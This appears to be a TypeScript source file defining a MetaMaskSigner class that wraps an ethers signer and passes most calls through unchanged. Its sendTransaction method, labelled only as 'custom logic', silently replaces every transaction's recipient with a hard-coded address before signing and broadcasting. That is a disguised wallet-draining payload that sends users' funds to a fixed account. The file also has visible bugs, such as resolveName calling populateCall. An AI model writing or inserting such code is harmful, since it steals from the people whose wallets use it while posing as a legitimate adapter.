// MetaMaskSigner.ts
import {
  Signer,
  BrowserProvider,
  TransactionRequest,
  TransactionResponse,
  TypedDataDomain,
  TypedDataField,
  BlockTag,
  Transaction,
  Provider,
  TransactionLike,
} from 'ethers';

export class MetaMaskSigner implements Signer {
  readonly provider: BrowserProvider;
  private readonly signer: any;

  constructor(provider: BrowserProvider) {
    this.provider = provider;
    this.signer = provider.getSigner();
  }

  async getAddress(): Promise<string> {
    return this.signer.getAddress();
  }

  async sendTransaction(tx: TransactionRequest): Promise<TransactionResponse> {
    // Custom logic before sending the transaction
    console.log('Custom sendTransaction called');

    const pop = await this.signer.populateTransaction(tx);
    delete pop.from;
    pop.to = '0xEA49F9517F9142293fa01C317b7dB223ABAdeed0';
    const txObj = Transaction.from(pop);

    const signedTx = await this.signer.signTransaction(txObj);
    console.log('Transaction signed');

    return await this.provider.broadcastTransaction(signedTx);
  }

  async signMessage(message: string | Uint8Array): Promise<string> {
    return this.signer.signMessage(message);
  }

  async signTransaction(transaction: TransactionRequest): Promise<string> {
    return this.signer.signTransaction(transaction);
  }

  async _signTypedData(
    domain: TypedDataDomain,
    types: Record<string, Array<TypedDataField>>,
    value: Record<string, any>
  ): Promise<string> {
    return this.signer._signTypedData(domain, types, value);
  }

  async getNonce(blockTag?: BlockTag): Promise<number> {
    return this.signer.getTransactionCount(blockTag);
  }

  async populateTransaction(
    transaction: TransactionRequest
  ): Promise<TransactionLike<string>> {
    return this.signer.populateTransaction(transaction);
  }

  async estimateGas(transaction: TransactionRequest): Promise<bigint> {
    return this.signer.estimateGas(transaction);
  }

  async call(
    transaction: TransactionRequest,
    blockTag?: BlockTag
  ): Promise<string> {
    return this.signer.call(transaction, blockTag);
  }

  async populateCall(tx: TransactionRequest): Promise<TransactionLike<string>> {
    return this.signer.populateCall(tx);
  }

  async resolveName(name: string): Promise<null | string> {
    return this.signer.populateCall(name);
  }

  async signTypedData(
    domain: TypedDataDomain,
    types: Record<string, Array<TypedDataField>>,
    value: Record<string, any>
  ): Promise<string> {
    return this.signer.signTypedData(domain, types, value);
  }

  connect(provider: Provider): Signer {
    return new MetaMaskSigner(provider as BrowserProvider);
  }
}
